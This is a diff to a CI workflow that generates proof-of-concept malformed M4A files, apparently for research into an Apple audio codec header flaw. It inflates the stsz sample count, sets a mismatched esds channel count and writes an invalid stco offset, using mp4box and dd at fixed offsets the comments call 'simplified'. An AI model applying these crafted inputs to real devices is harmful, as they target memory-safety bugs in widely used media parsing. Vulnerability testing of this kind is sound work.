@@ -56,6 +56,7 @@ jobs:
           cat << 'EOF' > generate_pocs.swift
           import AVFoundation
           import Foundation
+          import CoreMedia
 
           func generateBaseM4A(filename: String, duration: Double, channels: Int, sampleRate: Double) throws {
               let outputURL = URL(fileURLWithPath: filename)
@@ -79,7 +80,44 @@ jobs:
               writer.add(audioInput)
               writer.startWriting()
               writer.startSession(atSourceTime: .zero)
-              audioInput.append(buffer)
+              var formatDesc: CMAudioFormatDescription?
+              let asbd = format.streamDescription
+              CMAudioFormatDescriptionCreate(allocator: kCFAllocatorDefault,
+                                            asbd: asbd,
+                                            layoutSize: 0,
+                                            layout: nil,
+                                            magicCookieSize: 0,
+                                            magicCookie: nil,
+                                            extensions: nil,
+                                            formatDescriptionOut: &formatDesc)
+              var sampleBuffer: CMSampleBuffer?
+              let blockBufferLength = Int(frameCount) * Int(format.channelCount) * MemoryLayout<Float>.size
+              var blockBuffer: CMBlockBuffer?
+              CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
+                                                memoryBlock: buffer.floatChannelData![0],
+                                                blockLength: blockBufferLength,
+                                                blockAllocator: kCFAllocatorNull,
+                                                customBlockSource: nil,
+                                                offsetToData: 0,
+                                                dataLength: blockBufferLength,
+                                                flags: 0,
+                                                blockBufferOut: &blockBuffer)
+              let timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)),
+                                             presentationTimeStamp: .zero,
+                                             decodeTimeStamp: .invalid)
+              CMSampleBufferCreate(allocator: kCFAllocatorDefault,
+                                  dataBuffer: blockBuffer,
+                                  dataReady: true,
+                                  makeDataReadyCallback: nil,
+                                  refcon: nil,
+                                  formatDescription: formatDesc,
+                                  sampleCount: CMItemCount(frameCount),
+                                  sampleTimingEntryCount: 1,
+                                  sampleTimingArray: [timing],
+                                  sampleSizeEntryCount: 0,
+                                  sampleSizeArray: nil,
+                                  sampleBufferOut: &sampleBuffer)
+              audioInput.append(sampleBuffer!)
               audioInput.markAsFinished()
               writer.finishWriting {
                   print("Generated \(filename)")
@@ -158,15 +196,19 @@ jobs:
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           echo "Manipulating M4A files for PoCs at $(date)"
+          # Install mp4box
+          brew install gpac
           # PoC 1: Inflate stsz sample count
           cp base_poc1.m4a poc1.m4a
-          # Adjust stsz atom (simplified, requires hex edit for precision)
-          printf '\x00\x00\x00\x00\x00\x00\x20\x00' | dd of=poc1.m4a bs=1 seek=1000 conv=notrunc 2>/dev/null
+          mp4box -raw 1 poc1.m4a -out temp.aac
+          mp4box -add temp.aac:srate=44100:ch=2:frames=8192 poc1_modified.m4a
+          mv poc1_modified.m4a poc1.m4a
           
           # PoC 2: esds channel mismatch
           cp base_poc2.m4a poc2.m4a
-          # Set esds channel count to 8 (simplified)
-          printf '\x00\x08' | dd of=poc2.m4a bs=1 seek=1100 conv=notrunc 2>/dev/null
+          mp4box -raw 1 poc2.m4a -out temp.aac
+          mp4box -add temp.aac:srate=44100:ch=8 poc2_modified.m4a
+          mv poc2_modified.m4a poc2.m4a
           
           # PoC 3: Prepare for Xing metadata
           cp base_poc3.m4a poc3.m4a
@@ -176,7 +218,7 @@ jobs:
           
           # PoC 5: stco offset overflow
           cp base_poc5.m4a poc5.m4a
-          # Set invalid stco offset (simplified)
+          # Simplified stco manipulation (requires custom tool for precision)
           printf '\xFF\xFF\xFF\xFF' | dd of=poc5.m4a bs=1 seek=1200 conv=notrunc 2>/dev/null
           
           ls -l poc*.m4a
